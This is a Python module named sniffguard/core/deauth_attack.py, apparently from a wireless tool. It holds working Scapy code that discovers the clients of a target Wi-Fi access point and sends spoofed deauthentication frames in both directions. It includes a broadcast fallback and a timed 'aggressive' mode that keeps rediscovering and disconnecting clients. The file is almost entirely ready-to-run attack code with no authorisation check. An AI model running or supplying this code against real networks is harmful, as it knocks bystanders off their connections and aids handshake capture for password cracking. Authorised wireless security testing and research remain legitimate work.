# sniffguard/core/deauth_attack.py

import time
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from utils.logger import log

def validate_mac_address(mac):
    """Validate MAC address format"""
    import re
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def get_clients_for_ap(interface, target_bssid, timeout=30):
    """Discover clients connected to a specific AP by monitoring traffic"""
    clients = set()
    target_bssid = target_bssid.upper()
    
    log.info(f"Discovering clients for AP {target_bssid} on interface {interface}")
    
    def packet_handler(pkt):
        try:
            if pkt.haslayer(Dot11):
                dot11 = pkt[Dot11]
                
                # Look for data frames to/from the target AP
                if dot11.type == 2:  # Data frame
                    if dot11.addr1 and dot11.addr2 and dot11.addr3:
                        addr1 = dot11.addr1.upper()
                        addr2 = dot11.addr2.upper()
                        addr3 = dot11.addr3.upper()
                        
                        # Client to AP (addr3 = BSSID)
                        if addr3 == target_bssid and addr1 == target_bssid:
                            clients.add(addr2)
                        # AP to client (addr2 = BSSID)
                        elif addr2 == target_bssid and addr3 == target_bssid:
                            clients.add(addr1)
        except Exception as e:
            log.debug(f"Error processing packet for client discovery: {e}")
    
    try:
        sniff(iface=interface, prn=packet_handler, timeout=timeout, store=False)
        log.info(f"Discovered {len(clients)} clients for AP {target_bssid}: {list(clients)}")
        return list(clients)
    except Exception as e:
        log.error(f"Client discovery failed: {e}")
        return []

def launch_deauth_attack(interface, target_bssid, client_mac=None, count=10, delay=0.1):
    """
    Launch deauthentication attack against a target AP and optionally specific client.
    
    Args:
        interface: Monitor mode interface
        target_bssid: Target AP's BSSID
        client_mac: Specific client MAC (if None, discovers clients automatically)
        count: Number of deauth packets to send
        delay: Delay between packets in seconds
    
    Returns:
        tuple: (success, message, clients_targeted)
    """
    
    # Validate inputs
    if not validate_mac_address(target_bssid):
        error_msg = f"Invalid target BSSID format: {target_bssid}"
        log.error(error_msg)
        return False, error_msg, []
    
    if client_mac and not validate_mac_address(client_mac):
        error_msg = f"Invalid client MAC format: {client_mac}"
        log.error(error_msg)
        return False, error_msg, []
    
    target_bssid = target_bssid.upper()
    clients_to_target = []
    
    # Determine target clients
    if client_mac:
        clients_to_target = [client_mac.upper()]
        log.info(f"Targeting specific client: {client_mac}")
    else:
        # Auto-discover clients
        log.info("Discovering clients connected to the target AP...")
        discovered_clients = get_clients_for_ap(interface, target_bssid, timeout=15)
        if discovered_clients:
            clients_to_target = discovered_clients
            log.info(f"Will target {len(clients_to_target)} discovered clients")
        else:
            # If no clients discovered, target broadcast
            clients_to_target = ["ff:ff:ff:ff:ff:ff"]
            log.warning("No clients discovered. Using broadcast deauth.")
    
    try:
        total_packets = 0
        
        log.info(f"Starting deauthentication attack on {target_bssid}")
        log.info(f"Interface: {interface}, Count: {count}, Delay: {delay}s")
        
        for client in clients_to_target:
            log.info(f"Targeting client: {client}")
            
            # Create deauth packet from AP to client
            deauth_ap_to_client = (
                RadioTap() /
                Dot11(
                    type=0,       # Management frame
                    subtype=12,   # Deauth subtype
                    addr1=client,        # Destination (client)
                    addr2=target_bssid,  # Source (AP)
                    addr3=target_bssid   # BSSID
                ) /
                Dot11Deauth(reason=7)    # Reason: Class 3 frame from nonassociated STA
            )
            
            # Create deauth packet from client to AP
            deauth_client_to_ap = (
                RadioTap() /
                Dot11(
                    type=0,
                    subtype=12,
                    addr1=target_bssid,  # Destination (AP)
                    addr2=client,        # Source (client)
                    addr3=target_bssid   # BSSID
                ) /
                Dot11Deauth(reason=3)    # Reason: Deauth because sending STA is leaving
            )
            
            # Send deauth packets
            for i in range(count):
                try:
                    # Send AP -> Client deauth
                    sendp(deauth_ap_to_client, iface=interface, verbose=False)
                    total_packets += 1
                    
                    # Send Client -> AP deauth
                    sendp(deauth_client_to_ap, iface=interface, verbose=False)
                    total_packets += 1
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    log.error(f"Error sending deauth packet {i+1}: {e}")
                    continue
            
            log.debug(f"Sent {count*2} deauth packets to/from {client}")
        
        success_msg = f"Deauthentication attack completed. Sent {total_packets} packets to {len(clients_to_target)} clients."
        log.info(success_msg)
        return True, success_msg, clients_to_target
        
    except Exception as e:
        error_msg = f"Deauthentication attack failed: {e}"
        log.error(error_msg)
        return False, error_msg, clients_to_target

def launch_targeted_deauth(interface, target_bssid, duration=30, aggressive=False):
    """
    Launch a more sophisticated deauth attack with continuous monitoring.
    
    Args:
        interface: Monitor mode interface
        target_bssid: Target AP's BSSID
        duration: Attack duration in seconds
        aggressive: If True, uses higher frequency and more packets
    
    Returns:
        tuple: (success, message, stats)
    """
    
    if not validate_mac_address(target_bssid):
        error_msg = f"Invalid target BSSID: {target_bssid}"
        return False, error_msg, {}
    
    target_bssid = target_bssid.upper()
    stats = {'packets_sent': 0, 'clients_targeted': set(), 'errors': 0}
    
    # Set attack parameters based on aggressiveness
    if aggressive:
        packet_count = 20
        delay = 0.05  # 50ms
        discovery_interval = 5  # Re-discover clients every 5 seconds
    else:
        packet_count = 5
        delay = 0.1   # 100ms
        discovery_interval = 10 # Re-discover clients every 10 seconds
    
    log.info(f"Starting {duration}s targeted deauth attack on {target_bssid}")
    log.info(f"Mode: {'Aggressive' if aggressive else 'Normal'}")
    
    start_time = time.time()
    last_discovery = 0
    active_clients = set()
    
    try:
        while time.time() - start_time < duration:
            current_time = time.time()
            
            # Periodically discover new clients
            if current_time - last_discovery > discovery_interval:
                new_clients = get_clients_for_ap(interface, target_bssid, timeout=3)
                active_clients.update(new_clients)
                stats['clients_targeted'].update(new_clients)
                last_discovery = current_time
                
                if new_clients:
                    log.info(f"Updated client list: {len(active_clients)} active clients")
            
            # If no clients, use broadcast
            targets = list(active_clients) if active_clients else ["ff:ff:ff:ff:ff:ff"]
            
            # Launch attack against current targets
            for client in targets:
                success, msg, _ = launch_deauth_attack(
                    interface, target_bssid, client, 
                    count=packet_count, delay=delay
                )
                
                if success:
                    stats['packets_sent'] += packet_count * 2  # bidirectional
                else:
                    stats['errors'] += 1
            
            # Brief pause between attack rounds
            time.sleep(1)
        
        final_msg = f"Targeted deauth attack completed. Stats: {dict(stats)}"
        log.info(final_msg)
        return True, final_msg, dict(stats)
        
    except KeyboardInterrupt:
        log.info("Deauth attack interrupted by user")
        return True, "Attack interrupted", dict(stats)
    except Exception as e:
        error_msg = f"Targeted deauth attack failed: {e}"
        log.error(error_msg)
        return False, error_msg, dict(stats)
